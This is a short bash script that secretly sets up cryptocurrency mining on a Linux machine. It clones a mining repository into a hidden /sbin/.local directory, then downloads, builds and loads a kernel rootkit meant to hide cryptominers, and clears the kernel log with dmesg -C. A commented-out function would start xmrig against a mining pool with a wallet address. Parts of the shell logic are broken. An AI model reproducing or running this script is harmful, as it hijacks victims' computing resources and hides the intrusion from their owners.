#!/bin/bash

function mns_hd()
{

sudo find / -type f -name "xmrig" && sudo find / -type d -iwholename "/sbin/.local"

if [[ -e "xmrig" "sbin/.local" ]]; then

	echo "Does" || echo "Does not"
fi

type -P git &>/dev/null && type -P make && type -P gcc &>/dev/null


}

 : "for i in "$@"; do
   if [ "$i" = '--console' ]; then
      useConsole=1
   else
      args="$args $i"
   fi
 done
  "





function mns_hd(){

			 #finding all files name "xmrig"		 #findind specifiy dir	
sudo find / -type f -name "xmrig" ; sudo find / -type d -iwholename "/sbin/.local" && echo "exist" || echo "Does not"
	
	#if does not locate x will create a dir and download it		
[ echo = "does not" ] && type -P git &>/dev/null && sudo apt install git || echo "Nope"
#finding git command

#c
git clone https://github.com/Flyteeth/mining.git /sbin/.local/ || echo "no need"

#type -P command  #syntax type -P &>/dev/null 
type -P make &>/dev/null && echo "Found" || echo "Not Found" 

#if not found, install them
[ echo = "Not Found" ] && sudo apt install make && sudo apt install gcc 

}

function rkt_hd(){

	# adding find git if not install and continue the s
 git clone https://github.com/alfonmga/hiding-cryptominers-linux-rootkit.git /sbin/.local/

  #creatuing loop of command 
lst=( 'make /sbin/.local/hiding-cryptominers-linux-rootkit' 'dmesg -C' 'insmod rootkit.ko' )

for i in "${lst[@]}"; do
	$i
done
}

: 'function ex_hd(){
	lst2=( "sudo chmod +x /sbin/.local/mining/xmrig" "sudo bash /sbin/.local/xmrig -o stratum+ssl://rx.unmineable.com:443 -u rvn:RBAHoon299eiTh3WTVDDqdxKtw44gZ3o6Z.googlex4-1" )
for x in "${lst2[@]}"; do
	$x
done
}'

#ex_hd
mns_hd
rkt_hd
